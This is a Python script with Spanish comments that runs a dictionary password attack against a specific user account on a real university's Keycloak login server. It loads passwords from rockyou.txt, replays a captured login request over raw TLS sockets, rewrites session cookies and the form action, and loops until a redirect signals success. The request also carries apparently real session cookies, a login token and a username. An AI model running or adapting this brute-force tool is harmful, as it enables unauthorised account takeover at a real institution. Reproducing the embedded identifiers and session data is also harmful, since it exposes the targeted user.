import socket
import ssl
import re
from pyautogui import sleep

def bring_reader_to_begin(file_reader, counter_to_begin_of_attack):
    for _ in range(counter_to_begin_of_attack):
        file_reader.readline()

def send_init_request(ssls, request: bytes):
    ssls.send(request)
    data :bytes = ssls.recv(10000)
    request = request.replace(b"GET", b"POST") #Va a cambiar GET por POST
    print("Response received: ", data.decode())
    
    if (data.find(b"HTTP/1.1 302 Found") != -1): # Por si la solicitud es una redireccion
        print("Received HTTP/1.1 302 Found")
        if(data.find(b"Set-Cookie") != -1):
            request = request.replace(request[request.find(b"Cookie: AUTH_SESSION_ID=") + 24: request.find(b"; AUTH_SESSION_ID_LEGACY=")], data[data.find(b"Set-Cookie: AUTH_SESSION_ID=") + 28: data.find(b"; Version=1")]) # Aca colocamos las cookies de autenticacion
            request = request.replace(request[request.find(b"; AUTH_SESSION_ID_LEGACY=") + 25: request.find(b"; KC_RESTART=")], data[data.find(b"Set-Cookie: AUTH_SESSION_ID=") + 28: data.find(b"; Version=1")]) # Aca colocamos las cookies de autenticacion
            request = request.replace(request[request.find(b"POST /") + 6:request.find(b" HTTP/1.1")], data[data.find(b"Location: https://auth.uptc.edu.co/") + 35: data.find(b"\r\nX-Frame-Options:")]) # Aca colocamos la ruta de redireccion con el metodo get para que el sistema detecte nuestras cookies
            ssls.send(request)
            print("Request send: ", request.decode())
            data :bytes = ssls.recv(10000)
            print("Response received: ", data.decode())
            return data, request
        print(f"Received end: {data.decode()}")
        raise KeyboardInterrupt("Se ha encontrado una respuesta 302 Found (redireccion)")
    elif ((data.find(b"HTTP/1.1 400 Bad Request") != -1)) : # Por si esta mal la solicitud
        print(f"Received end: {data.decode()}")
        raise KeyboardInterrupt("Se ha encontrado una respuesta 400 Bad Request")
    else:
        request = request.replace(b"GET", b"POST") #Va a cambiar GET por POST
        return data, request

def send_request(ssls, request: str, data, file_reader):
    default_size = 33
    password_temp = ""
    
    begin = data.find(b"action=\"https://auth.uptc.edu.co/")
    end = data.find(b"\" method=\"post\">")
    request = request.replace(request[request.find(b"POST /") + 6:request.find(b" HTTP/1.1")], re.sub(b"&amp;", b"&", data[begin+33:end])) # Esta linea va a cambiar la direcciond de la peticion por la encontrada en la pagina
    password_temp = file_reader.readline()
    request = request.replace(request[request.find(b"&password=") + 10:len(request)], password_temp.encode("utf-8")) # Cambiamos la contraseña
    request = request.replace(request[request.find(b"Content-Length: ") + 16: request.find(b"\r\n\r\nusername=")], str(33 + len(password_temp.replace("\n", ""))).encode("utf-8")) # Cambiamos el header content length al valor de la longitud del cuerpo de la solicitud
    ssls.send(request)
    print("Request send: ", request.decode())
    data = ssls.recv(10000)
    print("Response received: ", data.decode())
    if ((data.find(b"HTTP/1.1 400 Bad Request") != -1)) :
        print(f"Received end: {data.decode()}")
        raise KeyboardInterrupt("Se ha encontrado una respuesta 400 Bad Request")
    elif (data.find(b"HTTP/1.1 302 Found") != -1):
        print(f"Received end: {data.decode()}")
        raise KeyboardInterrupt("Se ha encontrado una respuesta 302 Found (redireccion)")
    else:
        return data, request

def requests():
    counter_to_begin_of_attack = 0
    tries = 0
    file_reader = open("rockyou.txt", "r", encoding="utf-8")
    
    while True:
        try:
            
            bring_reader_to_begin(file_reader, counter_to_begin_of_attack)
            
            HOST = "132.255.20.44"
            PORT = 443

            context = ssl.create_default_context()

            request = b"GET /auth/realms/UPTC/login-actions/authenticate?client_id=SiWebDocente-publico&tab_id=kUl8RaYRG_0 HTTP/1.1\r\nHost: auth.uptc.edu.co\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate, br, zstd\r\nConnection: keep-alive\r\nCookie: AUTH_SESSION_ID=f013ac2e-b4a9-4efc-9a70-bf3ee434bdsadsa.auth.uptc.edu.co; AUTH_SESSION_ID_LEGACY=f013ac2e-b4a9-4efc-9a70-bf3ee434b5c2.auth.uptc.edu.co; KC_RESTART=eyJhbGciOiJIUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJjNzlhOWJiOS1jYTQwLTRkMDEtYWQ0YS0wZmQzY2UwOWNhYmIifQ.eyJjaWQiOiJTaVdlYkRvY2VudGUtcHVibGljbyIsInB0eSI6Im9wZW5pZC1jb25uZWN0IiwicnVyaSI6Imh0dHBzOi8vYXBwczMudXB0Yy5lZHUuY28vU2lXZWJEb2NlbnRlRnJvbnRFbmQvIy8iLCJhY3QiOiJBVVRIRU5USUNBVEUiLCJub3RlcyI6eyJzY29wZSI6Im9wZW5pZCIsImlzcyI6Imh0dHBzOi8vYXV0aC51cHRjLmVkdS5jby9hdXRoL3JlYWxtcy9VUFRDIiwicmVzcG9uc2VfdHlwZSI6ImNvZGUiLCJyZWRpcmVjdF91cmkiOiJodHRwczovL2FwcHMzLnVwdGMuZWR1LmNvL1NpV2ViRG9jZW50ZUZyb250RW5kLyMvIiwic3RhdGUiOiJmMjhmOTIwOS04NjFkLTRmMTctYTBiNC1kZmZmNzI4YmIzMjMiLCJub25jZSI6IjVkNWI2YzAzLTUxYjEtNGMwMy1iZmY5LTZmNTQwYTE4OGNhZiIsInJlc3BvbnNlX21vZGUiOiJmcmFnbWVudCJ9fQ.3LIQXYPix_25VI4PNbfPgmq7U-Zg_bQ4VBwEQ3878-8; _ga_8H3Z256MX0=GS2.1.s1754259215$o31$g0$t1754259215$j60$l0$h0; _ga=GA1.3.1297064787.1724681980; _ga_59DQSQQETS=GS1.1.1742867683.2.1.1742867704.0.0.0; _gid=GA1.3.841211510.1753815683\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-User: ?1\r\nPriority: u=0, i\r\nOrigin: null\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 49\r\n\r\nusername=jesus.suarez03&password=prMAs%23*%2F4709"
            file_path = "requests.txt" 
            with socket.create_connection((HOST, PORT)) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                with context.wrap_socket(s, server_hostname="auth.uptc.edu.co") as ssls:
                    # print(f"SSL/TLS version: {ssls.version()}")
                    data, request = send_init_request(ssls, request)
                    # print("\nData received", re.sub(b"&amp;", b"&", data[begin+33:end]))
                    # print("\nRequest: ", request)
                    while True:
                        tries = tries + 1
                        # print("\nRedirection found: ", re.sub(b"&amp;", b"&", data[begin+33:end]))
                        data, request = send_request(ssls, request, data, file_reader)
                        print(tries)
                    
                    print(f"Received again: {data.decode()}")
                    break
                    s.close()
                    ssls.close()
        except ssl.SSLError as e:
            print(f"SSL Error: {e}")
        except socket.error as e:
            print(f"Socket Error: {e}")
        except KeyboardInterrupt as e:
            print(f"Keyboard interrupt: {e}")
            return
        
requests()  